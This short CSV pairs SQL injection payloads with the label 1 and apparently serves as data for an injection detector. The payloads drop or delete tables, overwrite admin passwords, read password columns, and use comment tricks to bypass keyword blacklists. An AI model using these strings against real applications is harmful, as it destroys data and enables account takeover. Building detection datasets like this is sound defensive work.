column,num
DROP user;--,1
DROP member;--,1
DROP table;--,1
DROP admin_user;--,1
DROP topic;--,1
DROP sample;#,1
DROP tag;#,1
DROP comments;#,1
DROP taggings;#,1
DROP likes;#,1
;DELETE FROM atable--,1
;DELETE FROM users--,1
;DELETE FROM text--,1
;DELETE FROM sample_table--,1
;DELETE FROM hoge_tanle--,1
0;DELETE FROM atable,1
0;DELETE FROM users,1
0;DELETE FROM comments,1
0;DELETE FROM addressbook,1
0;DELETE FROM booking_table,1
test Õ||Õ ,1
Õ||Õ ,1
Õ;DROP user;--,1
Õ;DROP member;--,1
Õ;DROP table;--,1
Õ;DROP admin_user;--,1
Õ;DROP topic;--,1
Õ;DROP sample;#,1
;DROP user;--,1
;DROP member;--,1
;DROP table;--,1
;DROP admin_user;--,1
;DROP topic;--,1
;DROP sample;#,1
O'Reilly',1
" "" + user + """,1
/*!32302Ê10*/,1
"SELECT /*!32302 1/0, */ 1 FROM users",1
"SELECT /*!32302 1/0, */ 1 FROM shops",1
"SELECT /*!32302 1/0, */ 1 FROM purchase",1
"SELECT /*!32302 1/0, */ 1 FROM buyer",1
SELECT/*avoid-spaces*/password/**/FROM/**/members,1
SELECT/*avoid-spaces*/password/**/FROM/**/users,1
SELECT/*avoid-spaces*/password/**/FROM/**/table,1
SELECT/*avoid-spaces*/password/**/FROM/**/topics,1
SELECT/*avoid-spaces*/password/**/FROM/**/shops,1
DROP/*comment*/events,1
DROP/*comment*/sampletable,1
DROP/*comment*/prefectures,1
DROP/*comment*/tags,1
DROP/*comment*/likes,1
DR/**/OP/*bypass blacklisting*/tables,1
DR/**/OP/*bypass blacklisting*/gigs,1
DR/**/OP/*bypass blacklisting*/gig_events,1
DR/**/OP/*bypass blacklisting*/datas,1
DR/**/OP/*bypass blacklisting*/cities,1
123; update account_table set pw='foo' where uid='admin' --,1
123; update account_table set pw='password' where uid='name' --,1
123; update account_table set pw='pero' where uid='hoge' --,1
123; update account_table set pw='tehepero' where uid='hogehoge' --,1
123; update account_table set pw='aaaaa' where uid='111' --,1
123; update account_table set pw='pass' where uid='namae' --,1
123; update account_table set pw='password' where uid='admin' --,1
123; update account_table set pw='bbbbb' where uid='aaaaa' --,1
123; update account_table set pw='12345' where uid='12345' --,1
5; DROP TABLE members /* ,1
1; DROP TABLE users /* ,1
2; DROP TABLE tags /* ,1
14; DROP TABLE topics /* ,1
10; DROP TABLE comments /* ,1
10; DROP TABLE members /* ,1
10; DROP TABLE shops /* ,1
10; DROP TABLE users /* ,1
10; DROP TABLE texts /* ,1
; UPDATE addressbook SET address = '___',1
; UPDATE addressbook SET address = '',1
; UPDATE addressbook SET address = 'aaa',1
; UPDATE addressbook SET address = 'hogehoge',1
 exec id 1;delete from hoge;,1
 exec name 1;delete from users;,1
 exec title 1;delete from purcahse;,1
 exec name 1;delete from sample;,1
 exec name 1;delete from hoge;,1
